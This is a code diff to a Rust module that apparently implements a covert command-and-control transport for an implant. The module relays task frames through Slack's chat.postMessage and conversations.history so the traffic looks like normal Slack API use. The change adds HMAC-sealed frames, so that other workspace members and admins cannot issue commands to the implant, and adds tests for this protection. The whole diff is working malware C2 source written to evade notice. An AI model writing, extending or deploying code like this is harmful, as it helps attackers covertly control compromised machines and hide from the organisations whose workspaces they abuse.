@@ -6,10 +6,20 @@
 //! normal Slack API traffic to `api.slack.com`.
 //!
 //! ## Protocol
-//! - `send`: Base64-encode the frame, POST to `chat.postMessage` as message text.
-//! - `recv`: Poll `conversations.history`, filter out own bot messages, Base64-decode
-//!   the text of the first new message, return the frame.
+//! - `send`: HMAC-seal the frame, Base64-encode the sealed blob, POST to
+//!   `chat.postMessage` as message text. The HMAC tag is verified on recv so a
+//!   third party posting into the channel can never inject a frame.
+//! - `recv`: Poll `conversations.history`, filter out own bot messages,
+//!   Base64-decode each candidate, verify its HMAC tag, skip anything that
+//!   doesn't verify, return the first verified frame.
 //! - `health_check`: Call `auth.test` to verify the token and measure latency.
+//!
+//! ## Frame integrity (CRITICAL-22)
+//! Every relayed frame is wrapped as `tag(32) || len_be(4) || frame` before
+//! base64 (see [`crate::traits::seal_frame`]). The MAC key is a per-channel
+//! secret derived from the session key, so a workspace member, another bot, or
+//! an admin who posts a base64 blob into the channel can't task the implant —
+//! their blob has no valid tag and is skipped.
 //!
 //! ## Rate limiting
 //! Slack enforces ~1 msg/sec per channel. We enforce a 1.2 s inter-message gap to
@@ -20,7 +30,7 @@ use std::time::{Duration, Instant};
 use base64::Engine as _;
 use serde::Deserialize;
 
-use crate::traits::{Transport, TransportError};
+use crate::traits::{open_frame, seal_frame, Transport, TransportError};
 
 // ---- Slack API JSON shapes ------------------------------------------------
 
@@ -60,6 +70,10 @@ const MAX_FRAME: usize = 40 * 1024;
 pub struct SlackTransport {
     bot_token: String,
     channel_id: String,
+    /// HMAC-SHA256 key used to seal/verify relayed frames (CRITICAL-22).
+    /// Derived per-channel from the session key so a third party posting
+    /// into the channel cannot forge a valid tag.
+    channel_secret: [u8; 32],
     bot_user_id: Option<String>,
     agent: ureq::Agent,
     last_ts: Option<String>,
@@ -73,10 +87,18 @@ impl SlackTransport {
     /// `channel_id` is the Slack channel ID (e.g. `C0123456789`) — not the
     /// channel name. The bot must be invited to the channel with `chat:write`
     /// and `channels:history` scopes.
-    pub fn new(bot_token: String, channel_id: String) -> Self {
+    ///
+    /// `session_key` is the 32-byte shared secret the protocol layer already
+    /// holds; it is domain-separated into a per-channel HMAC key
+    /// (see [`crate::traits::derive_channel_key`]) so this channel's tags are
+    /// not reusable on any other transport. REQUIRED (CRITICAL-22): without it
+    /// any workspace member or bot could post a base64 blob and inject a C2
+    /// frame, because the sender check was only `user_id != our bot`.
+    pub fn new(bot_token: String, channel_id: String, session_key: &[u8; 32]) -> Self {
         Self {
             bot_token,
             channel_id,
+            channel_secret: crate::traits::derive_channel_key(session_key, b"slack"),
             bot_user_id: None,
             agent: ureq::AgentBuilder::new()
                 .timeout(Duration::from_secs(10))
@@ -84,6 +106,15 @@ impl SlackTransport {
             last_ts: None,
             next_send_after: None,
         }
+    }
+
+    /// Test-only constructor with a fixed all-zero session key, so unit tests
+    /// of the plumbing (frame size, name, rate-limit timer) don't need a real
+    /// secret. The channel_secret it derives is still a real HMAC key, just not
+    /// one an attacker could guess outside this test binary.
+    #[cfg(test)]
+    fn new_for_test(bot_token: String, channel_id: String) -> Self {
+        Self::new(bot_token, channel_id, &[0u8; 32])
     }
 
     // -- internal helpers ---------------------------------------------------
@@ -188,7 +219,10 @@ impl SlackTransport {
             .into_json()
             .map_err(|_| TransportError::Transient("Slack history parse error"))?;
 
-        // Find the first message that is NOT from our own bot.
+        // Find the first message that is NOT from our own bot AND carries a
+        // valid HMAC tag. Any message whose tag doesn't verify (a human, another
+        // bot, an admin pasting a base64 blob) is skipped without being decoded —
+        // CRITICAL-22: sender validation was only `user_id != our bot`.
         for msg in &payload.messages {
             let is_own = self
                 .bot_user_id
@@ -198,12 +232,20 @@ impl SlackTransport {
                 continue;
             }
 
-            // Decode the frame.
-            let frame = base64::engine::general_purpose::STANDARD
-                .decode(&msg.text)
-                .map_err(|_| TransportError::Transient("Slack message: bad base64"))?;
+            // Decode the candidate blob. Bad base64 isn't an error worth killing
+            // the channel for — it's just a non-C2 message we skip.
+            let Ok(blob) = base64::engine::general_purpose::STANDARD.decode(&msg.text) else {
+                continue;
+            };
 
-            // Advance the cursor.
+            // Verify the HMAC tag before treating the payload as a frame. A
+            // failed tag is a skip, not an error: legitimate non-C2 messages in
+            // the channel should not take the transport down.
+            let Ok(frame) = open_frame(&self.channel_secret, &blob) else {
+                continue;
+            };
+
+            // Advance the cursor only once we've accepted a frame.
             self.last_ts = Some(msg.ts.clone());
             return Ok(Some(frame));
         }
@@ -236,7 +278,10 @@ impl Transport for SlackTransport {
 
         self.enforce_rate_limit();
 
-        let text = base64::engine::general_purpose::STANDARD.encode(frame);
+        // Seal the frame with an HMAC tag + length prefix before base64 so the
+        // receiver can reject anything it didn't seal (CRITICAL-22).
+        let sealed = seal_frame(&self.channel_secret, frame);
+        let text = base64::engine::general_purpose::STANDARD.encode(&sealed);
         let body = serde_json::json!({
             "channel": self.channel_id,
             "text": text,
@@ -318,19 +363,19 @@ mod tests {
 
     #[test]
     fn max_frame_size_is_40k() {
-        let t = SlackTransport::new("xoxb-test".into(), "C000".into());
+        let t = SlackTransport::new_for_test("xoxb-test".into(), "C000".into());
         assert_eq!(t.max_frame_size(), 40 * 1024);
     }
 
     #[test]
     fn name_is_slack_api() {
-        let t = SlackTransport::new("xoxb-test".into(), "C000".into());
+        let t = SlackTransport::new_for_test("xoxb-test".into(), "C000".into());
         assert_eq!(t.name(), "slack-api");
     }
 
     #[test]
     fn oversized_frame_rejected() {
-        let mut t = SlackTransport::new("xoxb-test".into(), "C000".into());
+        let mut t = SlackTransport::new_for_test("xoxb-test".into(), "C000".into());
         let big = vec![0u8; 41 * 1024];
         match t.send(&big) {
             Err(TransportError::PayloadTooLarge(n)) => assert_eq!(n, 41 * 1024),
@@ -340,7 +385,7 @@ mod tests {
 
     #[test]
     fn send_cooldown_advances_timer() {
-        let mut t = SlackTransport::new("xoxb-test".into(), "C000".into());
+        let mut t = SlackTransport::new_for_test("xoxb-test".into(), "C000".into());
         assert!(t.next_send_after.is_none());
         t.enforce_rate_limit();
         // No-op when next_send_after is None.
@@ -348,5 +393,77 @@ mod tests {
         let before = Instant::now();
         t.enforce_rate_limit();
         assert!(before.elapsed() >= Duration::from_millis(SEND_COOLDOWN_MS));
+    }
+
+    // ---- CRITICAL-22 injection resistance --------------------------------
+    //
+    // These tests exercise the framing directly rather than `poll_history`
+    // (which needs a live Slack API). They prove the property CRITICAL-22 is
+    // about: a message whose tag doesn't verify is never decoded as a frame,
+    // whether it came from a human, another bot, or a workspace admin.
+
+    fn sealed_msg_text(t: &SlackTransport, frame: &[u8]) -> String {
+        // Mirror exactly what `send` puts on the wire.
+        let sealed = seal_frame(&t.channel_secret, frame);
+        base64::engine::general_purpose::STANDARD.encode(&sealed)
+    }
+
+    #[test]
+    fn sealed_frame_roundtrips_through_framing() {
+        // The legitimate path: a frame this transport sealed verifies and
+        // decodes back to the original bytes.
+        let t = SlackTransport::new_for_test("xoxb-test".into(), "C000".into());
+        let frame = b"implant-task-frame-bytes";
+        let text = sealed_msg_text(&t, frame);
+
+        let blob = base64::engine::general_purpose::STANDARD
+            .decode(&text)
+            .expect("sealed message is valid base64");
+        assert_eq!(open_frame(&t.channel_secret, &blob).unwrap(), frame);
+    }
+
+    #[test]
+    fn attacker_plain_base64_blob_is_skipped() {
+        // CRITICAL-22 regression: a third party pastes a plain base64 blob
+        // (no HMAC tag) into the channel. It must NOT decode as a frame.
+        let t = SlackTransport::new_for_test("xoxb-test".into(), "C000".into());
+        let attacker_blob = base64::engine::general_purpose::STANDARD
+            .encode(b"evil-implant-task-injected-by-human");
+        let decoded = base64::engine::general_purpose::STANDARD
+            .decode(&attacker_blob)
+            .unwrap();
+        assert_eq!(
+            open_frame(&t.channel_secret, &decoded),
+            Err(crate::traits::FrameIntegrityError)
+        );
+    }
+
+    #[test]
+    fn attacker_forged_tag_with_wrong_key_is_skipped() {
+        // A sophisticated attacker forges a full tag+length+frame blob but
+        // used a different key. The tag must not verify.
+        let legit = SlackTransport::new_for_test("xoxb-test".into(), "C000".into());
+        let attacker_key = crate::traits::derive_channel_key(&[0xFFu8; 32], b"slack");
+        let forged = seal_frame(&attacker_key, b"evil-task");
+
+        // Even a single-bit key difference makes the tag unverifiable.
+        assert_eq!(
+            open_frame(&legit.channel_secret, &forged),
+            Err(crate::traits::FrameIntegrityError)
+        );
+    }
+
+    #[test]
+    fn wrong_channel_label_tag_does_not_verify() {
+        // A tag sealed under the MCP channel label is not accepted by the
+        // Slack channel — domain separation between relay channels.
+        let session_key = [0x42u8; 32];
+        let slack = SlackTransport::new("xoxb-test".into(), "C000".into(), &session_key);
+        let mcp_key = crate::traits::derive_channel_key(&session_key, b"mcp");
+        let cross_blob = seal_frame(&mcp_key, b"x");
+        assert_eq!(
+            open_frame(&slack.channel_secret, &cross_blob),
+            Err(crate::traits::FrameIntegrityError)
+        );
     }
 }
